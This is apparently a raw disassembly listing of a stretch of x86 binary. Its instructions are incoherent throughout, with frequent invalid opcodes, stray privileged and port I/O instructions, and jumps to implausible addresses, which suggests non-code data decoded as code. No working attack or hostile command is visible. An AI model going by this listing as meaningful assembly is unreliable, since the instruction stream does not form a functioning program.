  429446:	fsubr  QWORD PTR [ebx]
  429448:	std    
  429449:	cmp    bh,BYTE PTR [eax+ebp*2-0xfd9545c]
  429450:	xchg   esi,eax
  429451:	in     al,0x5b
  429453:	sar    DWORD PTR [ebp+0x1e838246],1
  429459:	outs   dx,DWORD PTR ds:[esi]
  42945a:	xchg   edx,eax
  42945b:	cmp    eax,0x478a5392
  429460:	fnstenv [edx+0x21d18634]
  429466:	mov    dl,0xe
  429468:	idiv   dl
  42946a:	mov    al,ds:0xc9fa8227
  42946f:	push   esp
  429470:	adc    BYTE PTR [ebp-0x6d],ah
  429473:	push   esi
  429474:	pusha  
  429475:	leave  
  429476:	and    eax,0x60e539d0
  42947b:	fsubr  DWORD PTR [ebx-0x70e2f18a]
  429481:	xchg   esp,eax
  429482:	sar    BYTE PTR [edi],cl
  429484:	xchg   DWORD PTR [edx-0x39b6c1c7],esp
  42948a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42948b:	jnp    0x4294a7
  42948d:	mov    bl,ch
  42948f:	mov    dh,BYTE PTR [edi-0x62]
  429492:	or     eax,DWORD PTR [eax-0x425982a6]
  429498:	push   ss
  429499:	or     BYTE PTR [edi+eax*8+0x55831f42],ch
  4294a0:	enter  0xc861,0x18
  4294a4:	push   edx
  4294a5:	mov    eax,0xc75782f7
  4294aa:	test   DWORD PTR [ebx],0xb8bc2e13
  4294b0:	mov    eax,0x8b767f4b
  4294b5:	sbb    esi,DWORD PTR [ebx-0x6cc285e]
  4294bb:	sti    
  4294bc:	mov    ss,WORD PTR [esi]
  4294be:	int    0x3e
  4294c0:	aaa    
  4294c1:	cmp    BYTE PTR [eax],al
	...
  429533:	add    BYTE PTR [ecx-0xa],dl
  429536:	xor    eax,0x5bffb73e
  42953b:	(bad)  
  42953c:	std    
  42953d:	cmp    eax,0x8b63c4f3
  429542:	adc    ebx,DWORD PTR [ebp+0x1b708]
  429548:	test   BYTE PTR [eax],0x0
  42954b:	add    BYTE PTR [eax],ch
  42954d:	push   edx
  42954e:	inc    eax
  42954f:	dec    ebx
  429550:	cmp    eax,DWORD PTR [ecx]
  429552:	and    eax,0xc92e4f8e
  429557:	jle    0x42951b
  429559:	sbb    DWORD PTR [eax-0x2dbca686],edi
  42955f:	stos   BYTE PTR es:[edi],al
  429560:	mov    edi,0x9526afe7
  429565:	mov    ds:0x45d01f6d,al
  42956a:	add    eax,0xf79d6f1e
  42956f:	aam    0xe1
  429571:	sub    al,BYTE PTR [edx+0x151caef0]
  429577:	add    BYTE PTR [edx],0x4c
  42957a:	gs jae 0x4295e0
  42957d:	sub    BYTE PTR [edx+0x7a],dl
  429580:	ror    eax,1
  429582:	js     0x429576
  429584:	ja     0x429557
  429586:	ds xchg edx,eax
  429588:	dec    esi
  429589:	dec    esp
  42958a:	cmp    eax,0xe52f90f7
  42958f:	(bad)  
  429590:	imul   DWORD PTR [edx]
  429592:	shl    al,1
  429594:	verw   WORD PTR [ebx-0x3d]
  429598:	stc    
  429599:	push   edx
  42959a:	jge    0x429525
  42959c:	dec    edi
  42959d:	or     BYTE PTR [eax+0x551ea776],al
  4295a3:	idiv   DWORD PTR [eax-0x3813d2a9]
  4295a9:	aaa    
  4295aa:	stos   DWORD PTR es:[edi],eax
  4295ab:	(bad)  
  4295ac:	fimul  WORD PTR [esi]
  4295ae:	stos   BYTE PTR es:[edi],al
  4295af:	dec    esp
  4295b0:	retf   
  4295b1:	mov    ds:0x23abecd0,al
  4295b6:	mov    ah,0xc2
  4295b8:	repz retf 
  4295ba:	push   0x9d75b2ac
  4295bf:	dec    esi
  4295c0:	xlat   BYTE PTR ds:[ebx]
  4295c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4295c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4295c3:	jne    0x429557
  4295c5:	fcom   QWORD PTR [ebx+0x6553fbad]
  4295cb:	scas   eax,DWORD PTR es:[edi]
  4295cc:	cmp    eax,0x5e069a64
  4295d1:	jae    0x4295f5
  4295d3:	repz push ds
  4295d5:	push   edx
  4295d6:	pop    edi
  4295d7:	sub    BYTE PTR [eax-0x63],dh
  4295da:	test   eax,0xa36bcf4f
  4295df:	inc    edi
  4295e0:	out    0xf3,eax
  4295e2:	adc    ebp,DWORD PTR [ebx+0x40]
  4295e5:	cdq    
  4295e6:	adc    BYTE PTR [esi],ch
  4295e8:	pushf  
  4295e9:	push   ds
  4295ea:	push   edi
  4295eb:	cwde   
  4295ec:	mov    WORD PTR [eax-0x4a],bx
  4295f0:	(bad)  
  4295f1:	push   edx
  4295f2:	repnz sub BYTE PTR [edx],dl
  4295f5:	int    0xbb
  4295f7:	(bad)  
  4295f9:	clc    
  4295fa:	inc    edi
  4295fb:	jmp    0xbd2d:0x100bf364
  429602:	jg     0x42961c
  429604:	cdq    
  429605:	mov    cl,0xa0
  429607:	fimul  DWORD PTR [ecx-0x3a8e20d3]
  42960d:	ret    0xec6b
  429610:	das    
  429611:	jmp    0x8bfdaf9
  429616:	mov    BYTE PTR [ebx],ah
  429618:	xchg   edi,eax
  429619:	sbb    eax,0x16257d29
  42961e:	jno    0x4295ad
  429620:	jg     0x429672
  429622:	xor    esi,ecx
  429624:	sbb    al,0x30
  429626:	int3   
  429627:	mov    DWORD PTR [ecx+0x31d25279],ebp
  42962d:	scas   eax,DWORD PTR es:[edi]
  42962e:	jge    0x4295c2
  429630:	or     al,0x86
  429632:	or     esp,DWORD PTR [esp+ecx*2-0x2c]
  429636:	pop    esi
  429637:	and    ch,ch
  429639:	mov    ch,0xe0
  42963b:	es scas eax,DWORD PTR es:[edi]
  42963d:	out    0x6e,al
  42963f:	aam    0xab
  429641:	push   0x0
	...
  4296b2:	add    BYTE PTR [eax],al
  4296b4:	push   esi
  4296b5:	pop    ebx
  4296b6:	xor    al,0x78
  4296b8:	cmp    eax,0x737f5e7f
  4296bd:	ficom  DWORD PTR [ecx+0x4f]
  4296c0:	lock retf 0x94dd
  4296c4:	(bad)  
  4296c5:	mov    bh,0x1
  4296c7:	add    dh,dh
  4296c9:	add    BYTE PTR [eax],al
  4296cb:	add    BYTE PTR [ebp-0x70531ef9],al
  4296d1:	shl    dh,cl
  4296d3:	dec    eax
  4296d4:	sar    BYTE PTR [ebx],1
  4296d6:	arpl   si,si
  4296d8:	mov    eax,0xeb99510f
  4296dd:	lock inc ebx
  4296df:	ficom  DWORD PTR [ebx+0x63]
  4296e2:	add    BYTE PTR [edx],cl
  4296e4:	or     edi,DWORD PTR [edi+0x652be089]
  4296ea:	inc    ecx
  4296eb:	clc    
  4296ec:	repnz fucomi st,st(5)
  4296ef:	popa   
  4296f0:	xor    al,BYTE PTR [ebp-0x26]
  4296f3:	jnp    0x4296b3
  4296f5:	jmp    0x429761
  4296f7:	or     edx,DWORD PTR [ebx+0x4dad9fa9]
  4296fd:	fmul   QWORD PTR [edx+0x3f]
  429700:	push   esp
  429701:	pop    eax
  429702:	je     0x4296f8
  429704:	rcl    edi,0xe6
  429707:	test   DWORD PTR [edi],0x6d9b4beb
  42970d:	gs scas eax,DWORD PTR es:[edi]
  42970f:	cdq    
  429710:	ins    BYTE PTR es:[edi],dx
  429711:	inc    ebp
  429712:	test   DWORD PTR [edx-0x2be09fff],0x2a5710cb
  42971c:	cs gs (bad) 
  42971f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429720:	inc    ebx
  429721:	xor    BYTE PTR [edx+0x52],cl
  429724:	enter  0x33cd,0x7e
  429728:	ins    DWORD PTR es:[edi],dx
  429729:	retf   
  42972a:	lods   al,BYTE PTR ds:[esi]
  42972b:	add    edi,esp
  42972d:	js     0x429710
  42972f:	aam    0x8f
  429731:	mov    al,ds:0xa03cfe3e
  429736:	pop    ds
  429737:	aaa    
  429738:	push   eax
  429739:	mov    BYTE PTR [eax+ebx*8-0x18778874],dl
  429740:	adc    ecx,DWORD PTR [esi+ecx*2-0x4c9877f6]
  429747:	sbb    esp,ecx
  429749:	dec    esp
  42974a:	fmul   QWORD PTR [ebx-0xeed9dc6]
  429750:	jb     0x42971b
  429752:	lock push edi
  429754:	test   al,0x65
  429757:	repz add al,0x1f
  42975a:	jle    0x42978d
  42975c:	ret    0x4106
  42975f:	test   eax,0xee776e2
  429764:	popaw  
  429766:	or     DWORD PTR [ecx-0x7610e0b4],0xb3fa323b
  429770:	les    ecx,FWORD PTR [esi*2+0x6169b7d8]
  429777:	imul   ebp,esp
  42977a:	lods   eax,DWORD PTR ds:[esi]
  42977b:	xchg   esp,eax
  42977c:	rcl    DWORD PTR [ebx+0x131fbfd8],cl
  429782:	push   ss
  429783:	pop    ebp
  429784:	xor    BYTE PTR [edi],bh
  429786:	icebp  
  429787:	sahf   
  429788:	or     eax,0x7f23be3a
  42978d:	leave  
  42978e:	pusha  
  42978f:	push   0x63
  429791:	push   edi
  429792:	jp     0x42979a
  429794:	jo     0x4297b1
  429796:	shl    DWORD PTR [edx+0x5676a978],0x8c
  42979d:	call   0xd3e966e6
  4297a2:	inc    esp
  4297a3:	inc    esi
  4297a4:	add    ecx,DWORD PTR [eax+edi*2+0x2c]
  4297a8:	adc    eax,0x1c34d877
  4297ad:	xchg   ecx,eax
  4297ae:	(bad)  
  4297af:	aam    0x83
  4297b1:	scas   al,BYTE PTR es:[edi]
  4297b2:	sbb    BYTE PTR ds:0x187c1f93,bh
  4297b8:	pop    esp
  4297b9:	mov    DWORD PTR [ebx+0x5c],esp
  4297bc:	jl     0x4297be
  4297be:	icebp  
  4297bf:	push   ss
  4297c0:	push   ebx
  4297c1:	xchg   BYTE PTR [eax],al
	...
  429833:	add    BYTE PTR [esi],ah
  429835:	jp     0x4298a8
  429837:	les    edi,FWORD PTR [ebp-0x31]
  42983a:	mov    bh,0xfa
  42983c:	push   0xffffffa8
  42983e:	push   es
  42983f:	adc    edx,eax
  429841:	js     0x4297d0
  429843:	dec    ebx
  429844:	hlt    
  429845:	mov    eax,0xf60001
  42984a:	add    BYTE PTR [eax],al
  42984c:	or     al,0x24
  42984e:	inc    esi
  42984f:	repz adc DWORD PTR [ebp-0x13],ebp
  429853:	xchg   edi,eax
  429854:	repz mov ch,0xfe
  429857:	je     0x429845
  429859:	(bad)  
  42985a:	fsubr  QWORD PTR ds:0xbfbde710
  429860:	test   cl,0x81
  429863:	cwde   
  429864:	push   ss
  429865:	jae    0x429823
  429867:	xor    esp,ebx
  429869:	sbb    al,0x49
  42986b:	(bad)  [edx-0x6]
  42986e:	add    eax,DWORD PTR [eax-0x774044c6]
  429874:	or     BYTE PTR [esi+0x5099e282],dl
  42987a:	push   edi
  42987b:	xor    eax,esi
  42987d:	cmc    
  42987e:	ins    BYTE PTR es:[edi],dx
  42987f:	sub    bl,BYTE PTR [eax-0x40]
  429882:	adc    al,0x42
  429884:	enter  0x2479,0x32
  429888:	push   cs
  429889:	inc    ebp
  42988a:	mov    ecx,0xaeba5164
  42988f:	sti    
  429890:	add    al,0x34
  429892:	(bad)  
  429893:	cmc    
  429894:	icebp  
  429895:	inc    ebp
  429896:	out    0x2f,eax
  429898:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429899:	add    BYTE PTR [eax-0x49],dl
  42989c:	(bad)  
  42989e:	ret    0x9a62
  4298a1:	dec    esp
  4298a2:	push   edx
  4298a3:	jmp    0xd694d07
  4298a8:	sar    DWORD PTR [ebx+eiz*1],1
  4298ab:	cmp    edi,DWORD PTR [ecx]
  4298ad:	repz bound ebp,QWORD PTR [edi+0x4a471064]
  4298b4:	pop    es
  4298b5:	in     eax,0x59
  4298b7:	test   DWORD PTR [ecx-0x16],edx
  4298ba:	fwait
  4298bb:	jle    0x4298ee
  4298bd:	mov    eax,ds:0x486fad23
  4298c2:	jp     0x429934
  4298c4:	rcl    eax,1
  4298c6:	(bad)  
  4298c7:	in     eax,0xe1
  4298c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4298ca:	xor    al,0xb9
  4298cc:	sub    BYTE PTR [esi-0xd754aeb],dl
  4298d2:	ins    DWORD PTR es:[edi],dx
  4298d3:	fistp  DWORD PTR [ebp+ebx*4+0x74]
  4298d7:	popf   
  4298d8:	arpl   WORD PTR [edi],ax
  4298da:	scas   eax,DWORD PTR es:[edi]
  4298db:	popa   
  4298dc:	pop    eax
  4298dd:	les    edi,FWORD PTR [edi+edi*2]
  4298e0:	sbb    al,0xa1
  4298e2:	xor    BYTE PTR [ecx+0x52],dh
  4298e5:	(bad)  
  4298e6:	mov    edx,DWORD PTR [eax]
  4298e8:	sbb    cl,cl
  4298ea:	push   ss
  4298eb:	div    BYTE PTR [edi+0x1f]
  4298ee:	pop    ecx
  4298ef:	inc    ecx
  4298f0:	outs   dx,DWORD PTR ds:[esi]
  4298f1:	mov    esi,0xd1e65dec
  4298f6:	mov    ds:0x6dd8023c,eax
  4298fb:	repnz push ss
  4298fd:	xchg   ecx,eax
  4298fe:	popa   
  4298ff:	or     eax,0xb9d09648
  429904:	jg     0x429948
  429906:	dec    ebp
  429907:	fmul   DWORD PTR [esi+0x3b4e7e8]
  42990d:	fdiv   DWORD PTR [edi+0x101e67c9]
  429913:	sbb    BYTE PTR [edx-0x3a8cd014],0xc3
  42991a:	int    0xdf
  42991c:	mov    al,0x27
  42991e:	pop    ss
  42991f:	stos   BYTE PTR es:[edi],al
  429920:	or     al,0xb6
  429922:	fild   QWORD PTR [ecx]
  429924:	dec    esi
  429925:	mov    dl,0x61
  429927:	cdq    
  429928:	loopne 0x4298dc
  42992a:	fiadd  WORD PTR [edi]
  42992c:	mov    edi,0x5060a994
  429931:	jns    0x42998e
  429933:	mov    bh,0x6b
  429935:	mov    al,ds:0x2812e6ea
  42993a:	xchg   ebx,eax
  42993b:	jecxz  0x42996c
  42993d:	int    0xb1
  42993f:	bound  edx,QWORD PTR [edi]
  429941:	jbe    0x429943
	...
  4299b3:	add    BYTE PTR [ebp+0xc],cl
  4299b6:	clc    
  4299b7:	pop    ebx
  4299b8:	stc    
  4299b9:	(bad)  
  4299ba:	out    dx,eax
  4299bb:	push   ds
  4299bc:	ins    BYTE PTR es:[edi],dx
  4299bd:	xchg   ecx,eax
  4299be:	cld    
  4299bf:	sub    DWORD PTR [eax-0x1c],esp
  4299c2:	lock inc edx
  4299c4:	jmp    0x0:0xf60001b9
  4299cb:	add    BYTE PTR [ecx],bl
  4299cd:	mov    esi,DWORD PTR ss:[edi]
  4299d0:	das    
  4299d1:	sbb    bh,BYTE PTR [ebx+0x6b165021]
  4299d7:	mov    ebp,0x85279f47
  4299dc:	mov    ebx,0x140a6813
  4299e1:	ret    0x8e03
  4299e4:	xchg   esi,eax
  4299e5:	mov    esp,0xc42154e7
  4299ea:	jno    0x42999c
  4299ec:	inc    esp
  4299ed:	bound  eax,QWORD PTR [edx-0x3195caee]
  4299f3:	jge    0x429a4f
  4299f5:	xchg   esi,eax
  4299f6:	jge    0x429a70
  4299f8:	fisttp QWORD PTR [ecx]
  4299fa:	icebp  
  4299fb:	cmp    bh,BYTE PTR [ebp+0x12]
  4299fe:	fiadd  WORD PTR [eax-0x2c]
  429a01:	cmc    
  429a02:	cmc    
  429a03:	sub    bh,bl
  429a05:	adc    ecx,DWORD PTR [esi]
  429a07:	stos   DWORD PTR es:[edi],eax
  429a08:	cwde   
  429a09:	stos   DWORD PTR es:[edi],eax
  429a0a:	xchg   ebp,eax
  429a0b:	or     BYTE PTR [ecx],bl
  429a0d:	mov    al,BYTE PTR [eax]
  429a0f:	bound  edi,QWORD PTR [eax+0x1a8451ee]
  429a15:	sub    ebx,ebx
  429a17:	mov    al,cl
  429a19:	aad    0xef
  429a1b:	imul   ebp,esi,0x56
  429a1e:	addr16 inc edi
  429a20:	pop    ebp
  429a21:	adc    BYTE PTR [ecx-0x7d],0x63
  429a25:	pop    ds
  429a26:	test   DWORD PTR [esi+ebx*4-0xc],esi
  429a2a:	cmp    eax,0xb477a46b
  429a2f:	cld    
  429a30:	sbb    eax,0x56deef87
  429a35:	in     eax,dx
  429a36:	mov    DWORD PTR [edx-0x10fe47a2],edx
  429a3c:	test   DWORD PTR [eax-0x2],ebx
  429a3f:	pop    ecx
  429a40:	dec    ecx
  429a41:	pop    edx
  429a42:	fst    QWORD PTR [eax+0x15cf5815]
  429a48:	mov    esp,0xfc9d998e
  429a4d:	and    BYTE PTR [ecx+0x5eb95efd],dl
  429a53:	jecxz  0x429a22
  429a55:	mov    esi,0x6c4d41bb
  429a5a:	xchg   edx,eax
  429a5b:	in     al,0xd7
  429a5d:	adc    BYTE PTR [ebp+edx*8-0x48e1d785],ah
  429a64:	sahf   
  429a65:	jmp    0x256f:0xb8602604
  429a6c:	stos   DWORD PTR es:[edi],eax
  429a6d:	repnz imul edi,esi,0xffffffbe
  429a71:	sub    eax,0x9572a8eb
  429a76:	push   0xffffff8d
  429a78:	lods   al,BYTE PTR ds:[esi]
  429a79:	add    esi,ebx
  429a7b:	adc    al,0xd9
  429a7d:	jl     0x429a11
  429a7f:	cmp    eax,0x797588fe
  429a84:	pop    eax
  429a85:	mov    edi,0xb5d9868d
  429a8a:	push   edi
  429a8b:	push   edi
  429a8c:	mov    ds:0xd25540c0,eax
  429a91:	bound  eax,QWORD PTR ds:0x1ca8fd9a
  429a97:	cmp    DWORD PTR [eax],ebx
  429a99:	mov    ?,ebp
  429a9b:	adc    dl,BYTE PTR [ecx]
  429a9d:	stos   BYTE PTR es:[edi],al
  429a9e:	or     DWORD PTR [ebx+0x5f],edi
  429aa1:	and    al,0x6a
  429aa3:	(bad)  
  429aa4:	fcomp  DWORD PTR [ecx+0x7]
  429aa7:	jno    0x429af1
  429aa9:	mov    ch,0x24
  429aab:	push   cs
  429aac:	sahf   
  429aad:	mov    eax,ds:0x14a4cdc4
  429ab2:	mov    esi,0xe1fdde63
  429ab7:	test   DWORD PTR [ebp+0x5bf552b5],eax
  429abd:	xlat   BYTE PTR ds:[ebx]
  429abe:	push   esi
  429abf:	js     0x429af2
  429ac1:	jmp    0x429ac6
	...
  429b32:	add    BYTE PTR [eax],al
  429b34:	lds    edx,FWORD PTR [ebp-0x76]
  429b37:	cli    
  429b38:	call   0xe133:0xa97ff5ff
  429b3f:	ret    0x28f9
  429b42:	fisub  WORD PTR [ebp+0x1bae0]
  429b48:	test   BYTE PTR [eax],0x0
  429b4b:	add    BYTE PTR [esi-0xe9df055],ch
  429b51:	sbb    DWORD PTR [edx+0x11],edx
  429b54:	sub    BYTE PTR [esi],0xad
  429b57:	dec    esi
  429b58:	popf   
  429b59:	mov    ah,0xcc
  429b5b:	ins    DWORD PTR es:[edi],dx
  429b5c:	int    0xbf
  429b5e:	cmp    eax,0xf37cc239
  429b63:	cs inc eax
  429b65:	sub    al,0x58
  429b67:	jb     0x429bd6
  429b69:	retf   0xeee
  429b6c:	push   esp
  429b6d:	jmp    0x30744f86
  429b72:	pop    ds
  429b73:	push   ebp
  429b74:	leave  
  429b75:	outs   dx,BYTE PTR ds:[esi]
  429b76:	xchg   ebp,eax
  429b77:	cli    
  429b78:	(bad)  
  429b79:	xstore-rng (bad)
  429b7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429b7b:	xchg   DWORD PTR [ecx-0x79d7eadd],edx
  429b81:	xchg   DWORD PTR [esi+edx*8],esi
  429b84:	cmp    BYTE PTR [ecx+0x3486a1f4],0xda
  429b8b:	ins    DWORD PTR es:[edi],dx
  429b8c:	jne    0x429b2a
  429b8e:	inc    ebp
  429b8f:	cmp    al,0xd4
  429b91:	fdivr  QWORD PTR [eax]
  429b93:	repz mov eax,ds:0x91e4300c
  429b99:	(bad)
  429b9c:	jne    0x429b6b
  429b9e:	out    dx,eax
  429b9f:	les    esi,FWORD PTR [ebp+edx*8-0x11]
  429ba3:	sbb    BYTE PTR [edx-0xeb6d44],dh
  429ba9:	push   ax
  429bab:	and    DWORD PTR [edx],edi
  429bad:	jno    0x429b86
  429baf:	lock push esp
  429bb1:	ins    DWORD PTR es:[edi],dx
  429bb2:	lahf   
  429bb3:	jnp    0x429c09
  429bb5:	sub    ch,BYTE PTR [ebx+ebp*1-0x61]
  429bb9:	pop    edi
  429bba:	cmp    edi,DWORD PTR [esi+0x4c]
  429bbd:	aam    0xc7
  429bbf:	int    0x4f
  429bc1:	and    ecx,edi
  429bc3:	ins    BYTE PTR es:[edi],dx
  429bc4:	stos   DWORD PTR es:[edi],eax
  429bc5:	pop    ecx
  429bc6:	fisttp WORD PTR [edx+0x660d2380]
  429bcc:	ja     0x429b88
  429bce:	push   0x9f9e22f9
  429bd3:	dec    esp
  429bd4:	cmp    al,0x89
  429bd6:	(bad)  
  429bd7:	xor    ecx,DWORD PTR cs:[edx+0x75]
  429bdb:	(bad)  
  429bdc:	pop    ss
  429bdd:	xor    bl,BYTE PTR [edx-0x78fd008d]
  429be3:	ret    0x52ec
  429be6:	movlps xmm3,QWORD PTR [ebp-0x30]
  429bea:	add    al,0xb2
  429bec:	pop    ecx
  429bed:	inc    ebx
  429bee:	outs   dx,BYTE PTR ds:[esi]
  429bef:	out    dx,al
  429bf0:	outs   dx,BYTE PTR ds:[esi]
  429bf1:	pop    eax
  429bf2:	fisubr WORD PTR [eax]
  429bf4:	popa   
  429bf5:	push   esi
  429bf6:	fist   DWORD PTR [edx+ebp*2-0x63]
  429bfa:	into   
  429bfb:	aam    0xa
  429bfd:	sub    BYTE PTR [ecx-0x2ab8104c],dl
  429c03:	sub    esp,DWORD PTR [eax+edx*4]
  429c06:	push   edx
  429c07:	pop    ss
  429c08:	pop    ebx
  429c09:	mov    ds:0xc1a4d685,al
  429c0e:	out    dx,eax
  429c0f:	push   ecx
  429c10:	call   0xc2f7120a
  429c15:	push   0xf4058c3e
  429c1a:	sbb    ch,BYTE PTR [ebp-0x18]
  429c1d:	popa   
  429c1e:	mov    eax,0xe9ad9d3d
  429c23:	daa    
  429c24:	jg     0x429c87
  429c26:	and    al,BYTE PTR [edx+0x11edcd37]
  429c2c:	add    al,0xd4
  429c2e:	shr    BYTE PTR [ebx],cl
  429c30:	mul    DWORD PTR ds:[ecx]
  429c33:	in     al,dx
  429c34:	retf   0x4444
  429c37:	popf   
  429c38:	push   edx
  429c39:	outs   dx,DWORD PTR ds:[esi]
  429c3a:	imul   DWORD PTR [ebp-0x4f]
  429c3d:	mov    cl,0xa0
  429c3f:	push   ebx
  429c40:	aam    0xb9
	...
  429cb2:	add    BYTE PTR [eax],al
  429cb4:	xor    DWORD PTR [ebp+0x75f531f1],0xd7dfb5c1
  429cbe:	ins    BYTE PTR es:[edi],dx
  429cbf:	scas   al,BYTE PTR es:[edi]
  429cc0:	int    0x3e
  429cc2:	cmp    eax,0x1bbd625
  429cc7:	add    dh,dh
  429cc9:	add    BYTE PTR [eax],al
  429ccb:	add    BYTE PTR [ebx],bh
  429ccd:	push   ds
  429cce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429ccf:	shr    bl,1
  429cd1:	and    bh,BYTE PTR [edi]
  429cd3:	cmp    eax,0x2bb14f11
  429cd8:	add    al,0x1f
  429cda:	int    0x27
  429cdc:	ins    DWORD PTR es:[edi],dx
  429cdd:	mov    ebp,0x95fe1636
  429ce3:	in     eax,0x55
  429ce5:	clc    
  429ce6:	imul   esp,DWORD PTR [edi+0x2],0x10d389fb
  429ced:	xor    eax,ebx
  429cef:	call   0x5a49:0xf730738d
  429cf6:	sbb    dh,BYTE PTR [edi+edi*4]
  429cf9:	int3   
  429cfa:	ja     0x429cc8
  429cfc:	mov    esi,0x3db62e4d
  429d01:	sar    edi,cl
  429d03:	mov    ds:0xa3029125,al
  429d08:	xchg   esi,eax
  429d09:	mov    cl,0xb9
  429d0b:	mov    esp,0xf77b6d78
  429d10:	sub    dh,bl
  429d12:	sbb    al,BYTE PTR [ebx-0x16]
  429d15:	mov    ebp,0x33098896
  429d1a:	rol    DWORD PTR [ecx+0x4a],1
  429d1d:	out    0xe3,eax
  429d1f:	mov    al,0x37
  429d21:	xor    ebp,ebx
  429d23:	xlat   BYTE PTR ds:[ebx]
  429d24:	lds    edx,FWORD PTR [ebp+0x49]
  429d27:	adc    al,0xda
  429d29:	jecxz  0x429d09
  429d2b:	xor    ebp,DWORD PTR [edx]
  429d2d:	xor    esi,DWORD PTR cs:[edx]
  429d30:	sub    ecx,ecx
  429d32:	in     al,dx
  429d33:	in     eax,dx
  429d34:	test   ch,0x2
  429d37:	rol    BYTE PTR [edi-0x26902e3a],0x98
  429d3e:	fstp   TBYTE PTR [edx+eax*8-0x10]
  429d42:	ins    BYTE PTR es:[edi],dx
  429d43:	ret    
  429d44:	xchg   ecx,eax
  429d45:	not    BYTE PTR [esi]
  429d47:	mov    bl,0xee
  429d49:	and    DWORD PTR ds:[esi-0x36873dac],eax
  429d50:	lahf   
  429d51:	or     BYTE PTR [esi],cl
  429d53:	jle    0x429cf6
  429d55:	out    dx,al
  429d56:	jp     0x429cd9
  429d58:	push   ds
  429d59:	stos   BYTE PTR es:[edi],al
  429d5a:	cmc    
  429d5b:	loop   0x429d49
  429d5d:	es add eax,0x644adbfe
  429d63:	into   
  429d64:	mov    esp,0x3f41246b
  429d69:	clc    
  429d6a:	push   ecx
  429d6b:	push   es
  429d6c:	mov    dh,0xba
  429d6e:	inc    esi
  429d6f:	pop    ss
  429d70:	pop    ebp
  429d71:	fld    DWORD PTR [ecx+0x73]
  429d74:	daa    
  429d75:	mov    al,ds:0x7d4dcca5
  429d7a:	das    
  429d7b:	mov    al,ds:0x7de92460
  429d80:	repz dec ecx
  429d82:	sub    esp,eax
  429d84:	sub    al,0x18
  429d86:	(bad)  
  429d87:	bound  edx,QWORD PTR [ebp+0x49]
  429d8a:	mov    ds:0x5ef458d1,al
  429d8f:	ja     0x429d62
  429d91:	int3   
  429d92:	les    ecx,FWORD PTR [eax+0x1d177d70]
  429d98:	popa   
  429d99:	out    0xa5,eax
  429d9b:	cld    
  429d9c:	xor    al,0xda
  429d9e:	jecxz  0x429da2
  429da0:	into   
  429da1:	sbb    esp,DWORD PTR [eax+0x74]
  429da4:	icebp  
  429da5:	sub    esi,DWORD PTR [esp+eax*8-0x80]
  429da9:	jns    0x429e1b
  429dab:	pop    ds
  429dac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429dad:	and    eax,0xe9aac576
  429db2:	or     eax,DWORD PTR [esi]
  429db4:	(bad)  
  429db5:	addr16 stc 
  429db7:	mov    dh,0x8e
  429db9:	rcl    DWORD PTR [esi+0xd196a3f],cl
  429dbf:	inc    ebx
  429dc0:	fcom   st(3)
	...
  429e32:	add    BYTE PTR [eax],al
  429e34:	dec    edi
  429e35:	pop    ebp
  429e36:	pop    ecx
  429e37:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  429e3b:	fstp   QWORD PTR [eax+0x434e2ee0]
  429e41:	sbb    ebp,edx
  429e43:	aam    0xcc
  429e45:	mov    esp,0xf60001
  429e4a:	add    BYTE PTR [eax],al
  429e4c:	jecxz  0x429e84
  429e4e:	iret   
  429e4f:	ret    0xe556
  429e52:	clc    
  429e53:	push   es
  429e54:	call   0x5e0:0x6ab0d3ae
  429e5b:	div    BYTE PTR [ebx]
  429e5d:	call   0x1eeb2c0e
  429e62:	lar    ebp,WORD PTR [edi-0x2948c6f3]
  429e69:	in     eax,dx
  429e6a:	jno    0x429eaa
  429e6c:	js     0x429e85
  429e6e:	lods   eax,DWORD PTR ds:[esi]
  429e6f:	mov    edi,0x75398e20
  429e74:	inc    edi
  429e75:	dec    esp
  429e76:	jmp    0x72e9:0x7d7e5ab0
  429e7d:	jnp    0x429e04
  429e7f:	pusha  
  429e80:	fstp   DWORD PTR [ebx-0x1]
  429e83:	dec    edx
  429e84:	(bad)  
  429e85:	jae    0x429e4f
  429e87:	mov    edi,0x9819d93
  429e8c:	mov    ebp,ebp
  429e8e:	in     al,dx
  429e8f:	cs mov cl,0xf0
  429e92:	sbb    bh,dl
  429e94:	mov    ds:0x8e669ff2,eax
  429e99:	addr16 ret 0x7398
  429e9d:	mov    ebp,0x93785a4
  429ea2:	icebp  
  429ea3:	pop    ebp
  429ea4:	jo     0x429e7e
  429ea6:	pop    ds
  429ea7:	add    al,0x41
  429ea9:	out    0x9,eax
  429eab:	aad    0xfe
  429ead:	enter  0xec88,0xbc
  429eb1:	(bad)  
  429eb2:	rol    BYTE PTR [edi+0x378f989a],1
  429eb8:	sbb    ebp,ebx
  429eba:	adc    DWORD PTR [esi+ebx*2+0x7d4ddf57],eax
  429ec1:	inc    esp
  429ec2:	std    
  429ec3:	sbb    bh,BYTE PTR [edx]
  429ec5:	xchg   ebp,ebp
  429ec7:	jmp    0x6a9654e
  429ecc:	mov    edi,0x8e82f09e
  429ed1:	jae    0x429f04
  429ed3:	mov    BYTE PTR [ebp-0x7860a292],dh
  429ed9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429eda:	dec    esp
  429edb:	jp     0x429ea4
  429edd:	fldenv ds:0xc68cdeeb
  429ee3:	xchg   ecx,eax
  429ee4:	cmp    eax,esi
  429ee6:	aas    
  429ee7:	shl    ecx,1
  429ee9:	pop    esp
  429eea:	into   
  429eeb:	das    
  429eec:	xor    BYTE PTR [esi+edi*2+0x760d09a6],cl
  429ef3:	add    eax,0x4e23388b
  429ef8:	mov    ds:0x47053252,eax
  429efd:	lods   eax,DWORD PTR ds:[esi]
  429efe:	jae    0x429f7f
  429f00:	popa   
  429f01:	nop
  429f02:	jge    0x429f0e
  429f04:	add    al,0xb0
  429f06:	clc    
  429f07:	inc    edi
  429f08:	rcl    ebx,1
  429f0a:	imul   edx,DWORD PTR [esi+0x583731b7],0xf07e5249
  429f14:	imul   edx,DWORD PTR [ebp+0xc9fad1c],0x605aee34
